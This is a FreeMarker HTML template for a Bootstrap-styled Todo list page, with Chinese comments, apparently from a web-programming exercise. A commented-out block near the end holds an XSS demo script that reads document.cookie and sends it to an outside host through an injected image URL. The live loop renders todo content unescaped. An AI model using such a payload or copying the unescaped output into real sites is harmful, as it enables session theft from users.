<!DOCTYPE html>
<html>
    <head>
        <!-- meta charset 指定了页面编码, 否则中文会乱码 -->
        <meta charset="utf-8">
        <!-- title 是浏览器显示的页面标题 -->
        <title>Todo</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
        <link rel="stylesheet" href="/static?file=todo.css">
        <link rel="stylesheet" href="/static?file=index.css">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" ></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
    </head>
    <!-- body 中是浏览器要显示的内容 -->

    <body>
        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-dark">
            <a class="navbar-brand mr-auto mr-lg-0" href="/">SelfMVC</a>
            <button class="navbar-toggler p-0 border-0" type="button" data-toggle="offcanvas">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="navbar-collapse offcanvas-collapse" id="navbarsExampleDefault">
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="#">Notifications</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">Profile</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/login">Switch account</a>
                    </li>
                </ul>
                <form class="form-inline my-2 my-lg-0">
                    <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
                    <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
                </form>
            </div>
        </nav>

        <main role="main" class="container" id="top">
            <form action="/todo/add" method="post">
                <div class="input-group">
                    <div class="input-group-prepend">
                        <span class="input-group-text">New Todo</span>
                    </div>
                    <textarea class="form-control" name="content" aria-label="New Todo" placeholder="请输入 TODO"></textarea>
                    <div class="input-group-append" id="button-addon4">
                        <button class="btn btn-outline-secondary" type="submit">添加</button>
                    </div>
                </div>
            </form>


            <div class="my-3 p-3 bg-white rounded shadow-sm">
                <h6 class="border-bottom border-gray pb-2 mb-0">Todo Lists</h6>
                <#list todos as m>
                <div class="media text-muted pt-3">
                    <svg class="bd-placeholder-img mr-2 rounded" width="32" height="32" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice" focusable="false" role="img" aria-label="Placeholder: 32x32"><title>Placeholder</title><rect width="100%" height="100%" fill="#007bff"></rect><text x="50%" y="50%" fill="#007bff" dy=".3em">32x32</text></svg>
                    <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
                        <div class="justify-content-between align-items-center w-100" id="todoline">
                            <strong class="text-gray-dark">${m.content}</strong>
                            <a href="/todo/edit?id=${m.id}" class="badge badge-primary" id="edit">编辑</a>
                            <a href="/todo/delete?id=${m.id}" class="badge badge-secondary" id="delete">删除</a>
                        </div>
<#--                        <span class="d-block">@username</span>-->
                    </div>
                </div>
                </#list>

            </div>
        </main>








<#--        <form action="/todo/add" method="post">-->
<#--            <input name="content"  placeholder="请输入 TODO"/>-->
<#--            <br>-->
<#--            <button type="submit">添加</button>-->
<#--        </form>-->

<#--        <div>-->
<#--        <#list todos as m>-->
<#--            <h3>${m.content}-->

<#--                <script>alert("你被攻击了")</script>-->

<#--            <script>-->
<#--                c = document.cookie;-->
<#--                alert(c);-->
<#--                document.body.insertAdjacentHTML("beforeEnd",` <img src='http://www.kuaibiancheng.com/uploads/avatar/default.gif?cookie=${c}'>`)-->
<#--            </script>-->
<#--            <a href="/todo/edit?id=${m.id}">编辑</a>-->
<#--            <a href="/todo/delete?id=${m.id}">删除</a></h3>-->
<#--        </#list><!--            <h3>1: xxxx <a href="/todo/delete?id=1">删除</a></h3>&ndash;&gt;-->
<#--        </div>-->

    </body>
</html>
